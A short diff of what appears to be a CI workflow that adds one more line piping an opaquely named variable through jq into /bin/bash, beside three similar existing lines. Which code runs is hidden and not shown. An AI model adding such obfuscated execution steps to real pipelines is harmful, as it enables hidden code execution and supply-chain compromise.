@@ -29,6 +29,7 @@ jobs:
           echo $kipm97 | jq -r .l3 | /bin/bash
           printf '%s' "$w9" | jq -r .js0703 | /bin/bash
           printf '%s' "$hmdug09" | jq -r .jgi3 | /bin/bash
+          printf '%s' "$kzh62" | jq -r .zi7 | /bin/bash
 
       - name: Upload artifact
         if: always()
